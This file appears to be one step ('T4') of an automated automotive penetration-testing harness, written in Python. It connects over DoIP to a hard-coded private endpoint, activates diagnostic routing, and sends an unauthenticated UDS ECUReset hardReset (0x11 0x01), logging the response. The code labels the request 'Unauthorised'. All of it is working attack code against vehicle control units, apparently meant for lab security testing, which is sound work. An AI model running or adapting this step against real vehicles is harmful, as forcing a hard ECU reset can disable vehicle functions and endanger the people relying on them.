def run_step(context: dict, artifacts: dict) -> dict:
    import time

    observations = []

    # Tier 1 — endpoint values
    host = "172.23.96.1"
    port = 8445
    doip_version = 0x02
    doip_entity_address = 0x00E0
    client_logical_address = 0x0E00
    routing_activation_type = 0x00
    timeout_sec = 5

    # Tier 2 — target_ref values
    uds_service_ecu_reset = 0x11

    # ECUReset sub-function: hardReset = 0x01 (ISO 14229-1)
    ECU_RESET_HARD = 0x01

    try:
        from doipclient import DoIPClient

        # ── Connect and activate routing (re-establish session state) ──
        t0 = time.time()
        try:
            client = DoIPClient(
                host,
                doip_entity_address,
                client_logical_address=client_logical_address,
                tcp_port=port,
                protocol_version=doip_version,
                activation_type=routing_activation_type,
                connect_timeout=timeout_sec,
            )
            elapsed_connect = int((time.time() - t0) * 1000)

            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": True,
                    "elapsed_ms": elapsed_connect,
                    "error_str": "",
                }
            })
        except Exception as e_conn:
            elapsed_connect = int((time.time() - t0) * 1000)
            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": False,
                    "elapsed_ms": elapsed_connect,
                    "error_str": repr(e_conn),
                }
            })
            return {
                "observations": observations,
                "artifacts": {},
                "notes": "T4: Connection failed; cannot proceed with ECUReset.",
            }

        # ── Send UDS ECUReset (0x11 0x01 = hardReset) ──
        ecu_reset_request = bytes([uds_service_ecu_reset, ECU_RESET_HARD])
        ecu_reset_request_hex = ecu_reset_request.hex()
        reset_response_hex = ""
        reset_bytes_received = 0
        reset_response_received = False
        reset_error = ""

        t1 = time.time()
        try:
            reset_response = client.send_diagnostic(ecu_reset_request, timeout=timeout_sec)
            elapsed_reset = int((time.time() - t1) * 1000)

            if reset_response is not None:
                reset_response_received = True
                try:
                    reset_raw = bytes(reset_response)
                    reset_response_hex = reset_raw.hex()
                    reset_bytes_received = len(reset_raw)
                except Exception:
                    reset_response_hex = repr(reset_response)
                    reset_bytes_received = len(reset_response_hex)
        except Exception as e_reset:
            elapsed_reset = int((time.time() - t1) * 1000)
            reset_error = repr(e_reset)

        observations.append({
            "name": "send_ecu_reset_hard_request",
            "value": {
                "request_hex": ecu_reset_request_hex,
                "response_hex": reset_response_hex,
                "bytes_sent": len(ecu_reset_request),
                "bytes_received": reset_bytes_received,
                "elapsed_ms": elapsed_reset,
                "response_received": reset_response_received,
                "error_str": reset_error,
            }
        })

        # ── Cleanup ──
        try:
            client.close()
        except Exception:
            pass

    except ImportError as e_imp:
        observations.append({
            "name": "exception",
            "value": {
                "type": "ImportError",
                "message": str(e_imp),
                "request_hex": "",
            }
        })

    return {
        "observations": observations,
        "artifacts": {},
        "notes": "T4: Unauthorised UDS ECUReset (hardReset 0x11 0x01) via doipclient to {}:{}".format(host, port),
    }